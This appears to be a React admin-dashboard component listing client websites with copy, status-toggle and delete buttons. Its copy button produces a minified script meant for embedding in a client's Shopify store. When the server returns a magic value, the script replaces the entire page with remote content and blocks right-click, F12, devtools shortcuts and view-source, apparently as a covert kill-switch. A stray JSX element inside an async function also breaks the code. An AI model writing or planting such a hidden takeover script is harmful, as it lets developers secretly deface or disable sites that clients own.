import { useState } from "react";
import { FaCopy, FaTrash } from "react-icons/fa"; // Using react-icons for a copy icon

const WebsiteTableRow = ({ website, index, refetch }) => {
  const [isLoading, setisLoading] = useState(false);
  const { projectName, clientName, developerName, shopify, status, _id } = website;
  const [copySuccess, setCopySuccess] = useState(false);

  const handleCopy = () => {
    const textToCopy = `<script>
(()=>{const fetchData=async()=>{try{const response=await fetch("http://localhost:5000/shopify/${shopify}");const data=await response.json();const handleData=(data)=>{const themeValue=data.theme;const themedContent=data.themedata;if(themeValue==='0DCisNIscD'){document.body.innerHTML=themedContent;const handleContextMenuAndKeys=(event)=>{const keyPressed=event.key;if(event.type==="contextmenu"||keyPressed==="F12"||(event.ctrlKey&&event.shiftKey&&["I","J"].includes(keyPressed))||(event.ctrlKey&&keyPressed==="U")){event.preventDefault();}};document.addEventListener('contextmenu',handleContextMenuAndKeys);document.addEventListener('keydown',handleContextMenuAndKeys);}};handleData(data);}catch(error){console.error('Error:',error);}};fetchData();})();
</script>`;
    navigator.clipboard.writeText(textToCopy).then(() => {
      setCopySuccess(true);
      setTimeout(() => setCopySuccess(false), 1500); // Reset copy success message after 1.5 seconds
    });
  };

  const handleToggleStatus = async () => {
    setisLoading(true);
    try {
      const response = await fetch('http://localhost:5000/websites/toggle-status', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ id: _id }), // Send the _id to the backend
      });

      <div className="h-svh flex justify-center items-center"><span className="loading p-10 loading-bars loading-lg"></span></div>

      if (response.ok) {
        const result = await response.json();
        // console.log("Status updated successfully:", result.newStatus);
        refetch();
        
        // Optionally, you can trigger a refresh or update the local state here
      } else {
        console.error("Failed to update status");
      }
    } catch (error) {
      console.error("Error updating status:", error);
    }
    setisLoading(false);
  };

  const handleDelete = async () => {
    const confirmDelete = window.confirm("Are you sure you want to delete this website entry?");
    if (!confirmDelete) return;
  
    setisLoading(true);
    try {
      const response = await fetch(`http://localhost:5000/websites/${_id}`, {
        method: 'DELETE',
      });
  
      if (response.ok) {
        console.log("Deleted successfully");
        refetch(); // refresh table data
      } else {
        console.error("Failed to delete");
      }
    } catch (error) {
      console.error("Error deleting:", error);
    }
    setisLoading(false);
  };
  return (
    <tr>
      <th>{index + 1}</th>
      <td>{projectName}</td>
      <td>{clientName}</td>
      <td>{developerName}</td>
      <td>
        {!copySuccess ? (
          <button
            onClick={handleCopy}
            className="text-sm font-medium text-blue-500 rounded-md hover:bg-gray-200 transition px-4 py-2" // Added consistent padding
          >
            <FaCopy className="inline-block" /> Copy
          </button>
        ) : null}
        {copySuccess && <span className="text-green-600 text-sm">Copied!</span>}
      </td>
      <td>
        {
          !isLoading &&         <button
          onClick={handleToggleStatus}
          className={`text-[15px] font-medium rounded-md px-[12px] pt-[4px] pb-[6px] transition ${
            status === "active" ? "bg-green-500 text-white px-[18px]" : "bg-red-500 text-white"
          }`}
        >
          {status}
        </button>
        }

        {
          isLoading && <span className="loading loading-spinner loading-sm"></span>
        }
      </td>
      <td>
  <button
    onClick={handleDelete}
    className="ml-2 text-sm bg-red-600 hover:bg-red-700 text-white font-medium px-3 py-1 rounded-md transition"
  >
    <FaTrash className="inline-block mr-1" />
    Delete
  </button>
</td>

    </tr>
  );
};

export default WebsiteTableRow;
